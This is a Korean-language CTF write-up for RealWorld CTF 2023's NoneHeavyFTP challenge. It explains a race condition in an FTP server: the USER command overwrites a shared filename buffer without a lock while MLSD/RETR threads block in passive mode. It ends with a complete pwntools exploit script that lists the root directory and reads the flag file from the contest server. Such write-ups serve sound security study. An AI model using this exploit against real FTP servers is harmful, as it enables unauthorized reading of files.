<p>mutex는 기본적으로 쓰레드간 critical section 동시 진입을 막기 위해 존재한다. 그래서 lock을 걸면 mutex에 특정 값을 세팅하고 다른 쓰레드가 critical section에 진입하려하면 lock을 통해 mutex를 보고 막는다.
만약 다른 쓰레드가 lock을 하지 않고 그냥 돌리게 되면 mutex를 확인도 안하고 그냥 돌리게 된다. 결과적으로 lock 되었는데도 불구하고 다른 쓰레드가 shared variable에 접근할 수 있게된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">ftpUSER</span>(PFTPCONTEXT context, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>params)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( params <span style="color:#f92672">==</span> NULL )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#a6e22e">sendstring</span>(context, error501);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    context<span style="color:#f92672">-&gt;</span>Access <span style="color:#f92672">=</span> FTP_ACCESS_NOT_LOGGED_IN;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>(context, <span style="color:#e6db74">&#34; USER: &#34;</span>, (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)params);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">snprintf</span>(context<span style="color:#f92672">-&gt;</span>FileName, <span style="color:#66d9ef">sizeof</span>(context<span style="color:#f92672">-&gt;</span>FileName), <span style="color:#e6db74">&#34;331 User %s OK. Password required</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, params);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">sendstring</span>(context, context<span style="color:#f92672">-&gt;</span>FileName);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">/* Save login name to FileName for the next PASS command */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">strcpy</span>(context<span style="color:#f92672">-&gt;</span>FileName, params);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>ftpUSER 함수에서 mutex lock을 안해서 mutex와 상관없이 context 구조체에 접근할 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#a6e22e">ftp_effective_path</span>((<span style="color:#66d9ef">__int64</span>)(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">105</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">2</span>), (<span style="color:#66d9ef">__int64</span>)<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">3</span>], a2, <span style="color:#ae81ff">0x2000uLL</span>, <span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>]);
</span></span><span style="display:flex;"><span>  v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">stat64</span>(<span style="color:#f92672">&amp;</span>mutex[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>], <span style="color:#f92672">&amp;</span>v9);      <span style="color:#75715e">// get stat of file
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  align <span style="color:#f92672">=</span> mutex[<span style="color:#ae81ff">515</span>].__align;
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v4 <span style="color:#f92672">&amp;&amp;</span> (v9.st_mode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xF000</span>) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0x4000</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( align )
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">gnutls_record_send</span>();
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">send</span>(mutex[<span style="color:#ae81ff">1</span>].__lock, <span style="color:#e6db74">&#34;150 File status okay; about to open data connection.</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#34;</span>, <span style="color:#ae81ff">0x36uLL</span>, <span style="color:#ae81ff">0x4000</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">writelogentry</span>((<span style="color:#66d9ef">__int64</span>)mutex, (<span style="color:#66d9ef">__int64</span>)<span style="color:#e6db74">&#34; MLSD-LIST &#34;</span>, (<span style="color:#66d9ef">__int64</span>)a2);
</span></span><span style="display:flex;"><span>    mutex[<span style="color:#ae81ff">1</span>].__spins <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">pthread_mutex_lock</span>(mutex);
</span></span><span style="display:flex;"><span>    v7 <span style="color:#f92672">=</span> <span style="color:#a6e22e">pthread_create</span>(<span style="color:#f92672">&amp;</span>newthread, <span style="color:#ae81ff">0LL</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))mlsd_thread, mutex);
</span></span></code></pre></div><p>mlsd_thread를 호출한다.
그래서 이때 ftpUSER를 호출할 수 있는 상태가 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  buf.__pad[<span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">pthread_mutex_lock</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">__sigsetjmp</span>((<span style="color:#66d9ef">struct</span> __jmp_buf_tag <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf, <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">cleanup_handler</span>(a1);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">__pthread_unwind_next</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>  v1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__pthread_register_cancel</span>(<span style="color:#f92672">&amp;</span>buf);
</span></span></code></pre></div><p>mlsd_thread 함수의 첫부분을 보면 이때 mutex를 거는데, ftpUSER에서 mutex 상관없이 바꿀 수 있어서 사실상 무용지물이 된다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)fd <span style="color:#f92672">=</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">create_datasocket</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>a1[<span style="color:#ae81ff">515</span>].__align <span style="color:#f92672">||</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ftp_init_tls_session</span>(<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>], <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)fd, <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      v2 <span style="color:#f92672">=</span> <span style="color:#a6e22e">opendir</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">310</span>].__size[<span style="color:#ae81ff">8</span>]);         <span style="color:#75715e">// open dir
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      <span style="color:#66d9ef">if</span> ( v2 )
</span></span><span style="display:flex;"><span>      {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>        {
</span></span><span style="display:flex;"><span>          v3 <span style="color:#f92672">=</span> <span style="color:#a6e22e">readdir64</span>(v2);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v3 )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>          v1 <span style="color:#f92672">=</span> <span style="color:#a6e22e">mlsd_sub</span>(<span style="color:#f92672">&amp;</span>a1[<span style="color:#ae81ff">310</span>].__align <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, <span style="color:#f92672">*</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> <span style="color:#f92672">*</span>)fd, <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>fd[<span style="color:#ae81ff">4</span>], v3);
</span></span><span style="display:flex;"><span>          <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>v1 )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> ( <span style="color:#f92672">!</span>a1[<span style="color:#ae81ff">1</span>].__spins );
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">closedir</span>(v2);
</span></span><span style="display:flex;"><span>      }
</span></span></code></pre></div><p>mutex 걸고 create_datasocket을 호출해서 fd를 받아오는데, PASSIVE MODE 걸어주고 돌리면, 포트에 접속할때까지 create_datasocket에서 멈춘다.
그래서 멈췄을때 바로 FileName을 바꿔주면 안정적으로 race condition을 트리거할 수 있다.</p>
<p>fd로 결과를 보내준다.
이걸로 flag의 이름을 알 수 있다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>  fd <span style="color:#f92672">=</span> <span style="color:#a6e22e">create_datasocket</span>(a1);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( fd <span style="color:#f92672">!=</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
</span></span><span style="display:flex;"><span>  {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">*</span>(_QWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">20600</span>) )
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span>(<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)<span style="color:#a6e22e">ftp_init_tls_session</span>(<span style="color:#f92672">&amp;</span>v15, fd, <span style="color:#ae81ff">0</span>) )
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">goto</span> LABEL_6;
</span></span><span style="display:flex;"><span>      max_size <span style="color:#f92672">=</span> (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>)<span style="color:#a6e22e">gnutls_record_get_max_size</span>(v15);
</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( max_size <span style="color:#f92672">&gt;</span> <span style="color:#f92672">&amp;</span>_data_start )
</span></span><span style="display:flex;"><span>        max_size <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_data_start;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>      max_size <span style="color:#f92672">=</span> <span style="color:#f92672">&amp;</span>_data_start;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    v4 <span style="color:#f92672">=</span> <span style="color:#a6e22e">open64</span>((<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">12408</span>), <span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">*</span>(_DWORD <span style="color:#f92672">*</span>)(a1 <span style="color:#f92672">+</span> <span style="color:#ae81ff">80</span>) <span style="color:#f92672">=</span> v4;
</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> v4;
</span></span></code></pre></div><p>이거랑 같은 맥락으로 retr_thread도 FileName을 바꿔주면 된다.
당연히 앞에 ftpUSER 함수에서 user name을 바꿨으니 다시 로그인?을 해줘야한다.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>SOCKET <span style="color:#a6e22e">create_datasocket</span>(PFTPCONTEXT context)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    SOCKET				clientsocket <span style="color:#f92672">=</span> INVALID_SOCKET;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">struct</span> sockaddr_in	laddr;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">socklen_t</span>			asz;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(<span style="color:#f92672">&amp;</span>laddr, <span style="color:#ae81ff">0</span>, <span style="color:#66d9ef">sizeof</span>(laddr));
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">switch</span> ( context<span style="color:#f92672">-&gt;</span>Mode ) {
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> MODE_NORMAL:
</span></span><span style="display:flex;"><span>        clientsocket <span style="color:#f92672">=</span> <span style="color:#a6e22e">socket</span>(AF_INET, SOCK_STREAM, IPPROTO_TCP);
</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>DataSocket <span style="color:#f92672">=</span> clientsocket;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( clientsocket <span style="color:#f92672">==</span> INVALID_SOCKET )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> INVALID_SOCKET;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        laddr.sin_family <span style="color:#f92672">=</span> AF_INET;
</span></span><span style="display:flex;"><span>        laddr.sin_port <span style="color:#f92672">=</span> context<span style="color:#f92672">-&gt;</span>DataPort;
</span></span><span style="display:flex;"><span>        laddr.sin_addr.s_addr <span style="color:#f92672">=</span> context<span style="color:#f92672">-&gt;</span>DataIPv4;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">connect</span>(clientsocket, (<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>laddr, <span style="color:#66d9ef">sizeof</span>(laddr)) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> ) {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">close</span>(clientsocket);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> INVALID_SOCKET;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> MODE_PASSIVE:
</span></span><span style="display:flex;"><span>        asz <span style="color:#f92672">=</span> <span style="color:#66d9ef">sizeof</span>(laddr);
</span></span><span style="display:flex;"><span>        clientsocket <span style="color:#f92672">=</span> <span style="color:#a6e22e">accept</span>(context<span style="color:#f92672">-&gt;</span>DataSocket, (<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>laddr, <span style="color:#f92672">&amp;</span>asz);
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">close</span>(context<span style="color:#f92672">-&gt;</span>DataSocket);
</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>DataSocket <span style="color:#f92672">=</span> clientsocket;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( clientsocket <span style="color:#f92672">==</span> INVALID_SOCKET )
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> INVALID_SOCKET;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>DataIPv4 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>DataPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>        context<span style="color:#f92672">-&gt;</span>Mode <span style="color:#f92672">=</span> MODE_NORMAL;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> INVALID_SOCKET;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> clientsocket;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>PASSIVE MODE로 세팅해주고, 서버가 제공하는 포트에 접속해서 데이터를 받아주면 된다.</p>
<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
</span></span><span style="display:flex;"><span>s <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>send(x)
</span></span><span style="display:flex;"><span>rvu <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> local<span style="color:#f92672">==</span><span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;127.0.0.1&#39;</span>
</span></span><span style="display:flex;"><span>    mip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;127,0,0,1&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span> :
</span></span><span style="display:flex;"><span>    ip <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;47.89.253.219&#39;</span>
</span></span><span style="display:flex;"><span>    mip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;0,0,0,0&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> remote(ip,<span style="color:#ae81ff">2121</span>)
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER anonymous</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;ready&#39;</span>,pay)
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS AAAAA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; OK&#39;</span>,pay)
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASV </span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;logged in&#39;</span>,pay)
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;MLSD /</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Passive&#39;</span>,pay)
</span></span><span style="display:flex;"><span>rvu(mip<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> [int(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> recv]
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> recv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> recv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nc </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER /</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;flag name : &#34;</span>,end<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> input()
</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;USER anonymous</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; OK&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASS AAAAA</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;logged in&#39;</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;PASV </span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>rvu(mip<span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> rvu(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;)&#39;</span>)[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;,&#39;</span>)
</span></span><span style="display:flex;"><span>recv <span style="color:#f92672">=</span> [int(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> recv]
</span></span><span style="display:flex;"><span>port <span style="color:#f92672">=</span> recv[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">*</span> <span style="color:#ae81ff">256</span> <span style="color:#f92672">+</span> recv[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;nc </span><span style="color:#e6db74">{</span>ip<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span>port<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span><span style="color:#f92672">+</span>flag
</span></span><span style="display:flex;"><span>pay <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;RETR /hello.txt</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>
</span></span><span style="display:flex;"><span>s(pay)
</span></span><span style="display:flex;"><span>s(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;USER </span><span style="color:#e6db74">{</span>flag[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#e6db74">}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image1.png" alt=""  />

nc로 직접 접속해줘야된다.
<img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1.png" alt=""  />

<img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image5.png" alt=""  />

flag 이름 넣어주고 다른 포트로 다시 접속하면 된다.
<img loading="lazy" src="/blog/RealWorld_CTF_2023_NoneHeavyFTP/image-1-1.png" alt=""  />
</p>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
      <li><a href="https://msh1307.kr/tags/realworld-ctf-2023/">RealWorld CTF 2023</a></li>
      <li><a href="https://msh1307.kr/tags/realworld-ctf-noneheavyftp/">RealWorld CTF NoneheavyFTP</a></li>
    </ul>
  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://msh1307.kr">msh1307</a></span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
<script>
    document.getElementById("theme-toggle").addEventListener("click", () => {
        if (document.body.className.includes("dark")) {
            document.body.classList.remove('dark');
            localStorage.setItem("pref-theme", 'light');
        } else {
            document.body.classList.add('dark');
            localStorage.setItem("pref-theme", 'dark');
        }
    })

</script>
</body>

</html>
